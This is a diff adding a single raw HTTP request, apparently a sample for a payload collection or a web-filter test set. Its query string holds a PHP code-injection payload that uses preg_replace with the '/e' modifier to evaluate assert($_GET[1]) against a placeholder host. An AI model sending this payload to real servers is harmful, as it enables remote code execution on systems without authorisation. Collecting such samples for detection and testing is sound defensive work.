@@ -1,0 +1,4 @@
+GET /a?name=/*x*/preg_replace('/a/e','assert($_GET[1])','a') HTTP/1.1
+Host: demo.example.com
+Connection: close
+
